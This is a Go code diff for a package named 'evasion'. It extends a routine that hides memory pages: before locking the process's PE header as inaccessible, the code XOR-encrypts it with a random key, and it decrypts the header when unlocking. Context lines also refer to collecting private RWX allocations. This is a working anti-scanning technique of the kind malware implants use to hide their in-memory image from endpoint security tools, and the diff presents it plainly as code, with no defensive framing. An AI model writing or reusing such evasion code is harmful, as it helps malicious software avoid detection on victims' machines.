@@ -15,6 +15,7 @@ package evasion
 // briefly unlocked only when the caller needs to read or write them.
 
 import (
+	"crypto/rand"
 	"time"
 	"unsafe"
 
@@ -143,15 +144,35 @@ type pageRegion struct {
 	base    uintptr
 	size    uintptr
 	oldProt uint32
+	encrypt bool    // XOR-encrypt before hiding (safe only for non-executing regions)
+	key     [32]byte
 }
 
 func (r *pageRegion) hide() {
+	if r.encrypt {
+		// Make writable, XOR-scramble, then lock.
+		ntProtect(r.base, r.size, windows.PAGE_READWRITE)
+		r.xorInPlace()
+	}
 	r.oldProt, _ = ntProtect(r.base, r.size, windows.PAGE_NOACCESS)
 }
 
 func (r *pageRegion) show() {
-	if r.oldProt != 0 {
-		ntProtect(r.base, r.size, r.oldProt)
+	if r.oldProt == 0 {
+		return
+	}
+	if r.encrypt {
+		// Unlock, XOR-restore, then set original protection.
+		ntProtect(r.base, r.size, windows.PAGE_READWRITE)
+		r.xorInPlace()
+	}
+	ntProtect(r.base, r.size, r.oldProt)
+}
+
+func (r *pageRegion) xorInPlace() {
+	for i := uintptr(0); i < r.size; i++ {
+		p := (*byte)(unsafe.Pointer(r.base + i))
+		*p ^= r.key[i%32]
 	}
 }
 
@@ -163,10 +184,12 @@ func (r *pageRegion) show() {
 func collectProtectedRegions() []pageRegion {
 	var out []pageRegion
 
-	// 1. PE header (first page of the module)
+	// 1. PE header (first page of the module) — XOR-encrypted before locking
 	var base windows.Handle
 	if err := windows.GetModuleHandleEx(0, nil, &base); err == nil && base != 0 {
-		out = append(out, pageRegion{base: uintptr(base), size: protBufPageSize})
+		r := pageRegion{base: uintptr(base), size: protBufPageSize, encrypt: true}
+		rand.Read(r.key[:])
+		out = append(out, r)
 	}
 
 	// 2. Private RWX allocations
